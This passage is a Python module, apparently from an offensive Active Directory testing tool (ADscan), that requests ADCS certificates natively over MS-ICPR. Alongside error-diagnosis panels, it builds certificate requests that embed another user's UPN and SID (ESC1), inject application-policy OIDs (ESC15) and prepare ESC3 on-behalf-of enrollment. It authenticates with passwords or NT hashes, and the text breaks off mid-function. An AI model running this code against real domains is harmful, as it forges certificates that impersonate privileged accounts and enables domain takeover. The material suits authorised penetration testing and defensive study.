"""Native ADCS certificate request via aiosmb MS-ICPR (async).

Replaces the certipy CLI subprocess for cert enrollment.  The public entry
point is :func:`request_certificate_native`.
"""

from __future__ import annotations

import os
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from adscan_internal import telemetry
from adscan_internal.services.kerberos_tcp_target import (
    is_ip_address,
    resolve_kerberos_tcp_target,
)
from adscan_core.rich_output import (
    get_console,
    mark_sensitive,
    print_info,
    print_info_verbose,
    print_warning,
)

# MS-ICPR disposition code for "certificate issued"
_CR_DISP_ISSUED = 3

# UPN OtherName OID (szOID_NT_PRINCIPAL_NAME)
_UPN_OID = "1.3.6.1.4.1.311.20.2.3"

# MS AD SID extension OID
_NTDS_CA_SECURITY_EXT_OID = "1.3.6.1.4.1.311.25.2"


# ---------------------------------------------------------------------------
# Premium Rich UX helpers — kept local to the module so the service is
# self-contained.  All output is sanitization-aware via ``mark_sensitive``.
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class _FailureClassification:
    """Operator-readable explanation of why a cert request failed.

    Walks the exception chain (``__cause__`` / ``__context__``) to surface
    the underlying error class — ``TimeoutError`` raised by the ICPR RPC
    timeout box usually wraps a real ``OSError`` (No route to host /
    Connection refused) from the EPM connect attempt, and that root cause
    is what the operator needs to see.
    """

    severity: str          # "lab" (env/network) | "auth" | "policy" | "unknown"
    title: str             # short headline shown in the panel border
    summary: str           # one-line plain-English explanation
    actions: tuple[str, ...]  # concrete CLI/operator steps to remediate
    technical_label: str   # raw exception name + message for telemetry


# Exception names that indicate a lab/environment connectivity issue
# (CA host unreachable, firewall, network timeout) rather than an ADscan
# bug.  Ordered from most operator-meaningful (top) to plumbing-detail
# (bottom).  The classifier scans the chain shallowest-first and keeps
# the FIRST match — for asyncio timeouts the surface is ``TimeoutError``
# while the depth carries a less informative ``CancelledError`` (the
# raw cancel signal from ``asyncio.wait_for``).
_LAB_FAILURE_EXCEPTION_NAMES: tuple[str, ...] = (
    # Surface-level network errors that map directly to lab/connectivity.
    "TimeoutError",
    "ConnectionRefusedError",
    "ConnectionResetError",
    "ConnectionAbortedError",
    # asysocks / aiosmb transport surface.
    "SOCKSError",
    "SOCKSAuthError",
    # OSError comes after the specific subclasses so its messages
    # (``No route to host`` / ``Connection refused``) are inspected only
    # when no more specific class matched.
    "OSError",
    # DCERPC fault — kept last because it can also mean auth/policy
    # (ACCESS_DENIED etc.); future refinement can split this further.
    "DCERPCException",
    # asyncio plumbing — never the OPERATOR-meaningful cause, but match
    # so we still classify as lab rather than "unknown" when nothing
    # better appears in the chain.
    "CancelledError",
)


def _is_environment_failure(exc: BaseException) -> bool:
    """True when ``exc`` is a network / environment connectivity failure.

    Two complementary signals route an exception to the environment bucket:

    * Its class name is in :data:`_LAB_FAILURE_EXCEPTION_NAMES` (the curated
      surface-level set), OR
    * It is an :class:`OSError` instance.  This is the load-bearing addition:
      ``socket.gaierror`` (DNS resolution failure — ``Name or service not
      known``) subclasses ``OSError`` but its ``__name__`` is ``"gaierror"``,
      which is NOT in the name set, so a name-only match misclassified DNS
      failures as "unknown / may be an ADscan bug".  Matching the ``OSError``
      base catches ``gaierror`` and every other socket/connection error class
      regardless of its concrete name.
    """
    if isinstance(exc, OSError):
        return True
    return type(exc).__name__ in _LAB_FAILURE_EXCEPTION_NAMES


def _is_dns_resolution_failure(exc: BaseException) -> bool:
    """True when ``exc`` is a DNS name-resolution failure (``gaierror``).

    Matches both the concrete ``socket.gaierror`` class and the canonical
    resolver error messages so a ``gaierror`` wrapped as ``__cause__`` of a
    higher-level error is still recognised.
    """
    import socket

    if isinstance(exc, socket.gaierror):
        return True
    msg = str(exc).strip().lower()
    return any(
        marker in msg
        for marker in (
            "name or service not known",
            "name resolution",
            "nodename nor servname",
            "temporary failure in name resolution",
            "no address associated with hostname",
        )
    )


def _iter_exception_chain(exc: BaseException) -> "list[BaseException]":
    """Return the exception chain (cause + context), shallowest-first."""
    seen: set[int] = set()
    chain: list[BaseException] = []
    cursor: BaseException | None = exc
    while cursor is not None and id(cursor) not in seen:
        seen.add(id(cursor))
        chain.append(cursor)
        # ``__cause__`` is set by ``raise X from Y``; ``__context__`` is the
        # implicit chain. Either may carry the load-bearing root cause.
        nxt = cursor.__cause__ or cursor.__context__
        cursor = nxt
    return chain


def _classify_cert_request_failure(
    exc: BaseException,
    config: "CertRequestConfig",
) -> _FailureClassification:
    """Map a raised exception chain to an operator-facing classification.

    Lab/network issues are the dominant failure mode for ADCS enrollment:
    EPM connect to the CA host on port 135 times out when the CA is
    offline, on a different network namespace, or behind a firewall.

    Algorithm:

    1. Walk the chain shallowest-first.  Pick the FIRST exception whose
       class name is in :data:`_LAB_FAILURE_EXCEPTION_NAMES` AND is more
       informative than the plumbing classes deeper down — concretely,
       prefer ``TimeoutError`` over the ``CancelledError`` that asyncio
       wraps it around.
    2. Use that exception's message (if any) to refine the cause label
       (``No route to host`` / ``Connection refused`` / generic timeout).
    3. If nothing in the chain matched, fall back to "unknown" with the
       outermost class name so the operator still has a label.

    The OUTERMOST exception is also kept for the technical label so
    telemetry can correlate this incident with the surface-level error.
    """
    chain = _iter_exception_chain(exc)
    if not chain:
        return _FailureClassification(
            severity="unknown",
            title="ADCS enrollment failed",
            summary="Unknown error (empty exception chain).",
            actions=("Re-run with --debug to capture the full stack trace.",),
            technical_label="<no exception>",
        )

    surface = chain[0]
    surface_name = type(surface).__name__
    surface_msg = str(surface).strip()

    # First pass: prefer the shallowest *informative* match (skip the
    # final ``CancelledError`` if a better candidate exists earlier).
    # An ``OSError`` instance (which includes ``socket.gaierror``) is always
    # informative — the raw cancel signal from ``asyncio.wait_for`` is the
    # only class we defer to the second pass.
    selected: BaseException | None = None
    for link in chain:
        if type(link).__name__ == "CancelledError":
            continue
        if _is_environment_failure(link):
            selected = link
            break

    # Second pass: accept any lab-bucket match (including CancelledError)
    # if no informative one was found in the chain.
    if selected is None:
        for link in chain:
            if _is_environment_failure(link):
                selected = link
                break

    raw_label = (
        f"{surface_name}: {surface_msg}"
        if surface_msg
        else f"{surface_name} from {type(surface).__module__} (no message)"
    )

    if selected is None:
        # No lab-bucket match anywhere in the chain — fall back to
        # generic "unknown" with operator-readable label.
        return _FailureClassification(
            severity="unknown",
            title="ADCS enrollment failed",
            summary=(
                f"{surface_name}: {surface_msg}" if surface_msg
                else f"{surface_name} (no message — see --debug for full trace)"
            ),
            actions=(
                "Re-run with --debug to capture the full RPC dispatcher trace.",
                "If the error persists, capture the stack and report — it may be an ADscan bug.",
            ),
            technical_label=raw_label,
        )

    ca_host_masked = mark_sensitive(config.ca_host, "hostname")

    # DNS-resolution failure is its own environment cause and needs a
    # DIFFERENT checklist than an RPC-connectivity failure: the CA host
    # never resolved to an IP, so "port 135 filtered / service down /
    # connection timed out" framing is wrong and would send the operator
    # chasing a phantom firewall issue.  Surface a name-resolution cause
    # label + a resolver checklist instead.  ``socket.gaierror`` may be
    # the selected exception OR appear deeper as a ``__cause__`` of a
    # higher-level error, so scan the whole chain.
    if any(_is_dns_resolution_failure(link) for link in chain):
        summary = (
            f"The CA hostname {ca_host_masked} did not resolve from this host "
            "(DNS name-resolution failed). The enrollment never reached the "
            "CA because its name could not be turned into an IP address. This "
            "points to the environment's name resolution, not to ADscan."
        )
        actions = (
            f"Verify resolution:    nslookup {config.ca_host}   "
            f"(or: getent hosts {config.ca_host})",
            "Point the resolver at the domain controller / internal DNS that "
            "serves this domain's records.",
            f"As a fallback, add the CA host to /etc/hosts:  "
            f"<CA-IP>  {config.ca_host}",
            "If you only have the CA's IP, configure the workspace so the "
            "CA host is reachable by name (Kerberos SPNs require the FQDN).",
            "Once the CA hostname resolves, re-run the attack step.",
        )
        return _FailureClassification(
            severity="lab",
            title="ADCS enrollment failed — DNS resolution issue",
            summary=summary,
            actions=actions,
            technical_label=raw_label,
        )

    # Lab-bucket match — pick a neutral cause label that covers all
    # transport-layer failure modes (the operator can't tell the
    # difference between "host unreachable", "port filtered", "port
    # closed", "service down", and "request timed out" from the
    # exception alone, and naming just one of them anchors the operator
    # to a wrong hypothesis).  When the message clearly identifies a
    # specific signature, enrich the cause label — otherwise keep the
    # umbrella phrasing.
    chain_msgs_lower = " ".join(
        str(link).strip().lower() for link in chain if str(link).strip()
    )
    specific_signal: str | None = None
    if "no route to host" in chain_msgs_lower:
        specific_signal = "no route to host (the CA host or its subnet is not reachable from here)"
    elif "connection refused" in chain_msgs_lower:
        specific_signal = "connection refused (the CA RPC service is not listening on port 135)"
    elif "connection reset" in chain_msgs_lower:
        specific_signal = "connection reset by peer (mid-handshake drop — possible firewall/IDS)"

    selected_name = type(selected).__name__
    if specific_signal:
        summary = (
            f"The CA RPC endpoint did not respond on {ca_host_masked}:135. "
            f"Underlying signal: {specific_signal} ({selected_name})."
        )
    else:
        # Umbrella phrasing — list ALL likely environment causes so the
        # operator does not chase a single hypothesis. This is critical
        # because TimeoutError on EPM connect is indistinguishable from
        # the operator's vantage between several real-world causes.
        summary = (
            f"The CA RPC endpoint did not respond on {ca_host_masked}:135 "
            f"({selected_name}). Likely environment causes: the CA host is "
            "unreachable from your vantage, port 135 is filtered/closed by a "
            "firewall, the Certificate Services service is not running, or "
            "the connection timed out before the CA could answer."
        )

    # Lab-provider-aware remediation. When the workspace has a confirmed
    # fingerprint (set by the inference layer in
    # ``adscan_core/domain_inference.py``), mention specific VM/service
    # names; otherwise stay lab-agnostic to avoid inventing context the
    # operator did not provide.
    provider = str(config.lab_provider or "").strip().lower()

    common_actions = (
        f"Verify connectivity:  nc -zv {config.ca_host} 135",
        f"Verify routing:       ping -c 2 {config.ca_host}",
    )

    if provider == "goad":
        provider_actions = (
            "If the lab is GOAD — restart the CA VM if it is down:",
            "  vagrant up <ca_vm>   (typically braavos / kingslanding / "
            "winterfell depending on the GOAD subdomain)",
            "  Then re-run the attack step.",
        )
    elif provider:
        provider_actions = (
            "Confirm the CA host is online "
            "in that lab's control plane and re-run the attack step.",
        )
    else:
        # No fingerprint — customer engagement or unknown lab. Don't
        # mention GOAD; just give the canonical environment-checklist.
        provider_actions = (
            "Check VPN tunnel / network namespace if the CA host is on a "
            "remote segment.",
            "Confirm with the asset owner that the CA service (Certificate "
            "Services / certsvc) is running on the host.",
            "Confirm firewall ACLs allow your source IP on TCP/135 (EPM) "
            "and the dynamic RPC range to the CA host.",
        )

    actions = common_actions + provider_actions + (
        "Once connectivity is restored, re-run the attack step.",
    )
    return _FailureClassification(
        severity="lab",
        title="ADCS enrollment failed — environment / connectivity issue",
        summary=summary,
        actions=actions,
        technical_label=raw_label,
    )


def _render_cert_request_failure(
    classification: _FailureClassification,
    config: "CertRequestConfig",
) -> None:
    """Render the operator-facing failure panel for a cert request error.

    Replaces the legacy ``print_error("Certificate request failed: <exc>")``
    one-liner with a structured panel that:

    * Frames the situation accurately — labelled "lab/environment issue"
      when the root cause is a network/RPC failure, so the operator does
      not chase a phantom ADscan bug.
    * Lists actionable shell commands to verify the diagnosis.
    * Stays sanitization-aware via ``mark_sensitive``.

    The raw stack trace is emitted separately via ``print_info_debug``
    at the call site — debug-only by design.
    """
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    severity_colour = {
        "lab": "yellow",
        "auth": "red",
        "policy": "magenta",
        "unknown": "red",
    }.get(classification.severity, "red")

    icon = "⚠" if classification.severity == "lab" else "✗"

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=10)
    grid.add_column()

    grid.add_row(
        Text("Cause", style="dim"),
        Text(classification.summary, style="white"),
    )
    grid.add_row(
        Text("CA host", style="dim"),
        mark_sensitive(config.ca_host, "hostname"),
    )
    grid.add_row(
        Text("Template", style="dim"),
        Text(config.template, style="magenta"),
    )
    grid.add_row("", "")

    if classification.severity == "lab":
        framing = Text(
            "This points to the target environment, not to ADscan: the "
            "CA host is unreachable, its RPC port is filtered/closed, the "
            "Certificate Services service is down, or the connection timed "
            "out. Verify the connectivity items below before treating this "
            "as an ADscan defect.",
            style="bold yellow",
        )
        grid.add_row("", framing)
        grid.add_row("", "")

    grid.add_row(
        Text("Actions", style="dim"),
        Text("Operator next steps:", style="bold white"),
    )
    for action in classification.actions:
        grid.add_row("", Text(f"  • {action}", style="white"))

    grid.add_row("", "")
    grid.add_row(
        Text("Trace", style="dim"),
        Text(
            "Re-run with --debug for the full RPC dispatcher stack trace.",
            style="dim italic",
        ),
    )

    panel = Panel(
        grid,
        title=f"{icon}  {classification.title}",
        border_style=severity_colour,
        padding=(1, 2),
    )
    get_console().print(panel)


def _render_request_preflight(config: "CertRequestConfig") -> None:
    """Render a structured pre-flight panel before issuing the request."""
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text

    auth_mode = (
        "[yellow]NT hash[/]"
        if (config.password is None and config.nt_hash)
        else "[green]Password[/]"
    )
    cross_realm = (
        config.auth_domain is not None
        and config.target_domain is not None
        and config.auth_domain.lower() != config.target_domain.lower()
    )

    masked_user = mark_sensitive(
        f"{config.username}@{config.effective_auth_domain}", "user"
    )
    masked_target_domain = mark_sensitive(config.effective_target_domain, "domain")
    masked_ca_host = mark_sensitive(config.ca_host, "hostname")
    masked_kdc_auth = mark_sensitive(config.effective_auth_kdc_ip, "ip")
    masked_kdc_target = mark_sensitive(config.effective_target_kdc_ip, "ip")

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column(style="bold")

    grid.add_row("CA name", f"[cyan]{config.ca_name}[/]")
    grid.add_row("CA host", masked_ca_host)
    grid.add_row("Template", f"[magenta]{config.template}[/]")
    grid.add_row("Key size", f"[bold]{config.key_size}[/] bits RSA")
    grid.add_row("", "")
    grid.add_row("Enroller", masked_user)
    grid.add_row("Auth mode", auth_mode)
    grid.add_row("Auth realm", masked_target_domain if not cross_realm else "")
    if cross_realm:
        grid.add_row(
            "Cross-realm",
            f"[yellow]{mark_sensitive(config.auth_domain, 'domain')}[/] "
            f"→ [yellow]{masked_target_domain}[/]",
        )
        grid.add_row("Auth KDC", masked_kdc_auth)
        grid.add_row("Target KDC", masked_kdc_target)
    else:
        grid.add_row("KDC", masked_kdc_auth)
    grid.add_row("", "")

    if config.upn:
        grid.add_row("Subject", f"[bold red]{mark_sensitive(config.upn, 'user')}[/]")
        grid.add_row("Subject type", "SAN UPN (ESC1 / ESC3 / ESC13)")
    else:
        grid.add_row("Subject", masked_user)
        grid.add_row("Subject type", "Self (CN)")
    if config.sid:
        grid.add_row("Subject SID", "[dim]embedded (szOID_NTDS_CA_SECURITY_EXT)[/]")
    if config.on_behalf_of:
        grid.add_row("On-behalf-of", mark_sensitive(config.on_behalf_of, "user"))

    title = Text("  Native ADCS Enrollment  ", style="bold white on blue")
    panel = Panel(grid, title=title, border_style="blue", padding=(1, 2))
    get_console().print(panel)


def _render_request_result(
    config: "CertRequestConfig",
    cert,
    cert_serial: str,
    cert_subject: str,
    cert_san: Optional[str],
    pfx_path: Path,
) -> None:
    """Render a result panel summarising the issued certificate."""
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from cryptography.hazmat.primitives import hashes

    fingerprint_sha1 = ":".join(
        f"{b:02X}"
        for b in cert.fingerprint(hashes.SHA1())  # noqa: S303 — display only
    )
    fingerprint_sha256 = ":".join(f"{b:02X}" for b in cert.fingerprint(hashes.SHA256()))
    not_before = cert.not_valid_before_utc.strftime("%Y-%m-%d %H:%M:%S UTC")
    not_after = cert.not_valid_after_utc.strftime("%Y-%m-%d %H:%M:%S UTC")
    pub_key_size = cert.public_key().key_size
    sig_algo = (
        cert.signature_hash_algorithm.name.upper()
        if cert.signature_hash_algorithm
        else "?"
    )

    grid = Table.grid(padding=(0, 1), expand=False)
    grid.add_column(style="dim", justify="right", min_width=14)
    grid.add_column()

    grid.add_row("Status", "[bold green]✓ ISSUED[/]")
    grid.add_row("Serial", f"[cyan]{cert_serial}[/]")
    grid.add_row("Subject", cert_subject)
    if cert_san:
        grid.add_row("SAN UPN", f"[bold red]{mark_sensitive(cert_san, 'user')}[/]")
    grid.add_row("Issuer", cert.issuer.rfc4514_string())
    grid.add_row("Public key", f"RSA {pub_key_size} bits")
    grid.add_row("Signature", sig_algo)
    grid.add_row("Valid from", not_before)
    grid.add_row("Valid to", not_after)
    grid.add_row("SHA-1 fp", f"[dim]{fingerprint_sha1}[/]")
    grid.add_row("SHA-256 fp", f"[dim]{fingerprint_sha256[:48]}...[/]")
    grid.add_row("", "")
    grid.add_row("PFX path", mark_sensitive(str(pfx_path), "path"))

    title = Text("  Certificate Issued  ", style="bold white on green")
    panel = Panel(grid, title=title, border_style="green", padding=(1, 2))
    get_console().print(panel)


def _hint_for_failure(
    disposition: Optional[int], message: Optional[str]
) -> Optional[str]:
    """Return a one-line user-facing hint for known CA failure modes."""
    msg = (message or "").lower()
    if disposition == 2:
        return "CA returned 'Denied' — caller likely lacks Enroll on the template DACL."
    if "key length" in msg or "key size" in msg:
        return "Template enforces a higher minimum key size — retry with a larger key_size."
    if "template" in msg and ("not found" in msg or "unknown" in msg):
        return "Template name not found on this CA — verify the case-sensitive CN."
    if "approval" in msg or "pending" in msg:
        return (
            "CA configured for manager approval — capture request_id and call "
            "retrieve_certificate_native() once approved."
        )
    return None


@dataclass(frozen=True)
class CertRequestConfig:
    """Parameters for a native ADCS certificate request.

    Single-realm: set ``domain`` + ``kdc_ip`` only.

    Cross-realm (auth domain ≠ target CA domain): set ``auth_domain`` /
    ``auth_kdc_ip`` for the user's home KDC and ``target_domain`` /
    ``target_kdc_ip`` for the realm hosting the CA.  ``domain`` / ``kdc_ip``
    remain as the legacy single-realm fields and are used as fallback when
    the cross-realm fields are not provided.

    Args:
        domain: Single-realm AD domain (legacy, used as auth+target when
            no cross-realm fields are supplied).
        kdc_ip: Single-realm KDC IP (legacy fallback).
        ca_host: IP or FQDN of the ADCS server hosting the CA.
        ca_name: CA short name as registered in AD (e.g. ``ESSOS-CA``).
        template: Certificate template name (e.g. ``ESC1``).
        username: Account used to enroll.
        password: Plaintext password for the enrolling account.
        nt_hash: NT hash — alternative to password for RC4 Kerberos.
        pfx_cred_path: Path to agent-enrollment PFX (ESC3 on-behalf-of).
        pfx_cred_pass: Password for the agent-enrollment PFX.
        upn: ESC1 — UPN to embed in SubjectAlternativeName OtherName.
        sid: ESC1 — SID to embed in the MS ADCS SID extension.
        key_size: RSA key size in bits (default 2048).
        on_behalf_of: ESC3 — enroll on behalf of this account (``DOMAIN\\user``).
        ca_fqdn: FQDN of the CA server (e.g. ``braavos.essos.local``). Required
            when ``ca_host`` is an IP — Kerberos SPN is ``cifs/<ca_fqdn>``.
        auth_domain: Cross-realm — domain the enrolling user lives in.
        target_domain: Cross-realm — domain the CA lives in.
        auth_kdc_ip: Cross-realm — KDC IP of the auth domain (where AS-REQ
            goes for the initial TGT).
        target_kdc_ip: Cross-realm — KDC IP of the target domain (used for
            referral resolution when fetching the inter-realm TGS).
        application_policies: Optional list of application policy OIDs to embed
            in the CSR (ESC15 — enrollment-agent policy injection).
    """

    domain: str
    kdc_ip: str
    ca_host: str
    ca_name: str
    template: str
    username: str
    password: Optional[str] = None
    nt_hash: Optional[str] = None
    pfx_cred_path: Optional[str] = None
    pfx_cred_pass: Optional[str] = None
    upn: Optional[str] = None
    sid: Optional[str] = None
    key_size: int = 2048
    on_behalf_of: Optional[str] = None
    ca_fqdn: Optional[str] = None
    auth_domain: Optional[str] = None
    target_domain: Optional[str] = None
    auth_kdc_ip: Optional[str] = None
    target_kdc_ip: Optional[str] = None
    application_policies: Optional[list[str]] = None
    ip_hostname_inventory: Optional[dict[str, list[str]]] = None
    # NTLM-to-IP direct connection (centralized host→IP resolver, layer g/b/c).
    # When ``connect_ip`` is set and ``force_ntlm`` is True the enrollment
    # connects straight to that IP over an authenticated NTLM session — no DNS,
    # no Kerberos SPN. This is the recovery path for an unresolvable (typically
    # cross-forest) CA whose name has no route from the current vantage. The
    # caller must posture-gate it (never set ``force_ntlm`` when NTLM is
    # disabled for the realm). ``connect_ip`` without ``force_ntlm`` simply
    # overrides the TCP address while keeping the Kerberos SPN path.
    connect_ip: Optional[str] = None
    force_ntlm: bool = False
    # When the workspace has a fingerprinted lab provider (``"goad"``,
    # ``"htb"``, etc.), pass it here so the failure panel can give
    # lab-specific remediation hints (e.g. "vagrant up braavos" for GOAD).
    # ``None`` means no fingerprint — the panel falls back to lab-agnostic
    # advice so we never invent a context the operator didn't confirm.
    lab_provider: Optional[str] = None

    def __post_init__(self) -> None:
        """Enforce data invariants for credential and CA hostname routing.

        After construction:
          - ``nt_hash`` carries any 32-hex-character NTLM hash even if the
            caller supplied it via ``password``. Keeping a hash in ``password``
            makes Kerberos derive an AES key from the hash treated as
            plaintext, which fails AS-REQ preauth.
          - ``ca_fqdn`` equals ``ca_host`` when ``ca_host`` is an FQDN, or is
            a valid FQDN/None when ``ca_host`` is an IP. An IP passed as
            ``ca_fqdn`` is discarded.

        Using object.__setattr__ because the dataclass is frozen.
        """
        # Credential routing (must run before any field-based dispatch downstream).
        from adscan_internal.services.credential_routing import (
            promote_credential_fields,
        )

        new_pwd, new_hash, _, _ = promote_credential_fields(
            password=self.password, nt_hash=self.nt_hash
        )
        if new_pwd != self.password:
            object.__setattr__(self, "password", new_pwd)
        if new_hash != self.nt_hash:
            object.__setattr__(self, "nt_hash", new_hash)

        ca_host = (self.ca_host or "").strip()
        ca_fqdn = (self.ca_fqdn or "").strip() or None

        host_is_ip = is_ip_address(ca_host) if ca_host else False
        host_is_fqdn = bool(ca_host) and not host_is_ip and "." in ca_host

        if host_is_fqdn:
            # ca_host is already a fully qualified hostname — it is the source
            # of truth for the Kerberos SPN.  Override ca_fqdn unconditionally
            # so downstream consumers always see a consistent pair.
            if ca_fqdn and ca_fqdn.casefold() != ca_host.casefold():
                print_warning(
                    f"CertRequestConfig: ca_fqdn={mark_sensitive(ca_fqdn, 'hostname')!r} "
                    f"disagrees with ca_host={mark_sensitive(ca_host, 'hostname')!r} "
                    "— using ca_host as the FQDN."
                )
            object.__setattr__(self, "ca_fqdn", ca_host)
            return

        # ca_host is an IP.  ca_fqdn (if set) must be a hostname, not another IP.
        if ca_fqdn and is_ip_address(ca_fqdn):
            print_warning(
                f"CertRequestConfig: ca_fqdn={mark_sensitive(ca_fqdn, 'hostname')!r} "
                "is an IP, not an FQDN — discarding."
            )
            object.__setattr__(self, "ca_fqdn", None)

    @property
    def effective_auth_domain(self) -> str:
        """Domain used for the AS-REQ (where the user lives)."""
        return self.auth_domain or self.domain

    @property
    def effective_target_domain(self) -> str:
        """Domain hosting the CA (target of the TGS)."""
        return self.target_domain or self.domain

    @property
    def effective_auth_kdc_ip(self) -> str:
        """KDC IP for the auth domain."""
        return self.auth_kdc_ip or self.kdc_ip

    @property
    def effective_target_kdc_ip(self) -> str:
        """KDC IP for the target domain (referral target)."""
        return self.target_kdc_ip or self.kdc_ip


@dataclass
class CertRequestResult:
    """Result of a native certificate request attempt.

    Args:
        success: Whether the CA issued the certificate.
        pfx_path: Path to the written PFX file (if issued).
        pfx_password: Random password protecting the PFX.
        cert_subject: Subject DN extracted from the issued cert.
        cert_san: SAN UPN extracted from the issued cert (if present).
        cert_serial: Hex serial number.
        request_id: Request ID assigned by the CA.
        disposition: Raw disposition code returned by MS-ICPR.
        error: Error message if ``success`` is False.
    """

    success: bool
    pfx_path: Optional[Path] = None
    pfx_password: Optional[str] = None
    cert_subject: Optional[str] = None
    cert_san: Optional[str] = None
    cert_serial: Optional[str] = None
    request_id: Optional[int] = None
    disposition: Optional[int] = None
    error: Optional[str] = None


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _build_smb_url(config: CertRequestConfig) -> str:
    """Build an aiosmb SMB URL from a CertRequestConfig.

    Kerberos-password is preferred; NT hash provides RC4 Kerberos fallback.
    The URL host is the Kerberos SPN target, not necessarily the TCP address:
    when ``ca_host`` is an IP and ``ca_fqdn``/PTR yields a hostname, pass the
    hostname as URL host and ``serverip=<ca_host>`` for direct connection.
    All variable components are URL-encoded to avoid misparse on special chars.
    """
    import urllib.parse

    def _q(v: str) -> str:
        return urllib.parse.quote(v, safe="")

    # NTLM-to-IP direct branch: when an operator/env IP was supplied for an
    # otherwise-unresolvable CA, connect straight to the IP over an
    # authenticated NTLM session. No Kerberos SPN, no serverip=/dc= params —
    # MS-ICPR enrollment is auth-agnostic, so NTLM completes it with no DNS or
    # realm lookup. Posture-gated by the caller (never reached when NTLM is
    # disabled for the realm).
    if config.force_ntlm and config.connect_ip:
        if config.password:
            scheme = "smb+ntlm-password"
            secret = _q(config.password)
        elif config.nt_hash:
            scheme = "smb+ntlm-nt"
            secret = _q(config.nt_hash)
        else:
            raise ValueError(
                "CertRequestConfig must supply either password or nt_hash"
            )
        # The AS-REQ goes nowhere here — NTLM authenticates against the host
        # directly. The domain prefix stays so the credential targets the right
        # account namespace.
        domain = _q(config.effective_auth_domain.upper())
        username = _q(config.username)
        connect_ip = _q(config.connect_ip)
        return f"{scheme}://{domain}\\{username}:{secret}@{connect_ip}"

    if config.password:
        scheme = "smb+kerberos-password"
        secret = _q(config.password)
    elif config.nt_hash:
        scheme = "smb+kerberos-nt"
        secret = _q(config.nt_hash)
    else:
        raise ValueError("CertRequestConfig must supply either password or nt_hash")

    # The AS-REQ goes to the user's home KDC (auth domain).  In single-realm
    # configs auth_domain == target_domain == domain, so this is a no-op there.
    domain = _q(config.effective_auth_domain.upper())
    username = _q(config.username)
    auth_kdc = config.effective_auth_kdc_ip
    target = resolve_kerberos_tcp_target(
        target_host=config.ca_host,
        spn_host=_resolve_ca_hostname(config),
        resolver_ip=config.effective_target_kdc_ip or config.effective_auth_kdc_ip,
        domain=config.effective_target_domain,
        ip_hostname_inventory=config.ip_hostname_inventory,
    )
    from adscan_internal.services._kerberos_spn import (
        require_kerberos_target_hostname,
    )

    spn_host = require_kerberos_target_hostname(target.spn_host, protocol="SMB")
    params: list[str] = []
    if target.server_ip:
        params.append(f"serverip={_q(target.server_ip)}")
    if auth_kdc:
        params.append(f"dc={_q(auth_kdc)}")

    # aiosmb URL format: scheme://DOMAIN\user:secret@host?dc=kdc_ip
    # Host = CA SPN target; dc= directs the AS-REQ to the auth KDC. For cross-realm
    # the inter-realm TGS is fetched implicitly via referrals from auth_kdc.
    url = f"{scheme}://{domain}\\{username}:{secret}@{spn_host}"
    if params:
        url += f"/?{'&'.join(params)}"
    return url


def _build_csr(config: CertRequestConfig, key) -> bytes:
    """Generate a DER-encoded CSR with optional UPN SAN and SID extension."""
    from asn1crypto import core as asn1core
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes
    from cryptography.x509.oid import NameOID

    # CN reflects the enrolling principal — under the *auth* (home) domain.
    cn = f"{config.username}@{config.effective_auth_domain}"
    builder = x509.CertificateSigningRequestBuilder().subject_name(
        x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    )

    # ESC1: embed the target UPN in SubjectAlternativeName
    if config.upn:
        upn_encoded = asn1core.UTF8String(config.upn).dump()
        builder = builder.add_extension(
            x509.SubjectAlternativeName(
                [x509.OtherName(x509.ObjectIdentifier(_UPN_OID), upn_encoded)]
            ),
            critical=False,
        )

    # Optional SID extension (szOID_NTDS_CA_SECURITY_EXT, OID 1.3.6.1.4.1.311.25.2).
    # Required for PKINIT under Windows Strong Certificate Binding (Full Enforcement mode).
    # The extension uses GeneralNames > AnotherName with type_id 1.3.6.1.4.1.311.25.2.1
    # and the SID string as the value (ASCII-encoded in an OctetString).
    if config.sid:
        try:
            from asn1crypto import cms as _asn1cms
            from asn1crypto import x509 as _asn1x509

            _OID_NTDS_OBJECTSID = "1.3.6.1.4.1.311.25.2.1"
            sid_bytes = config.sid.encode("ascii")
            sid_ext_value = _asn1x509.GeneralNames(
                [
                    _asn1x509.GeneralName(
                        {
                            "other_name": _asn1x509.AnotherName(
                                {
                                    "type_id": _asn1cms.ObjectIdentifier(
                                        _OID_NTDS_OBJECTSID
                                    ),
                                    "value": _asn1x509.OctetString(sid_bytes).retag(
                                        {"explicit": 0}
                                    ),
                                }
                            )
                        }
                    )
                ]
            )
            builder = builder.add_extension(
                x509.UnrecognizedExtension(
                    x509.ObjectIdentifier(_NTDS_CA_SECURITY_EXT_OID),
                    sid_ext_value.dump(),
                ),
                critical=False,
            )
        except Exception:
            # SID extension is best-effort
            pass

    # ESC15: embed application policy OIDs (e.g. enrollment-agent OID) in the CSR.
    # Uses the Application Policies extension OID (szOID_APPLICATION_CERT_POLICIES).
    if config.application_policies:
        _APP_POLICIES_OID = "1.3.6.1.4.1.311.21.10"
        try:
            from asn1crypto import core as _asn1

            # Build a minimal SEQUENCE OF PolicyInformation, each SEQUENCE { OID }.
            pieces: list[bytes] = []
            for oid_str in config.application_policies:
                oid_val = _asn1.ObjectIdentifier(oid_str)
                oid_der = oid_val.dump()
                # PolicyInformation SEQUENCE wrapping the OID
                pi_body = oid_der
                pi_len = len(pi_body)
                pi = bytes([0x30, pi_len]) + pi_body
                pieces.append(pi)
            inner = b"".join(pieces)
            seq_of_val = bytes([0x30, len(inner)]) + inner
            builder = builder.add_extension(
                x509.UnrecognizedExtension(
                    x509.ObjectIdentifier(_APP_POLICIES_OID),
                    seq_of_val,
                ),
                critical=False,
            )
        except Exception:
            pass  # best-effort

    return builder.sign(key, hashes.SHA256()).public_bytes(
        __import__(
            "cryptography.hazmat.primitives.serialization", fromlist=["Encoding"]
        ).Encoding.DER
    )


def _build_on_behalf_csr(csr_der: bytes, config: CertRequestConfig) -> bytes:
    """Wrap a plain CSR in a CMC envelope for ESC3 on-behalf-of requests.

    Microsoft's MS-WCCE CA expects a *CMC ContentInfo* (RFC 5272) rather than a
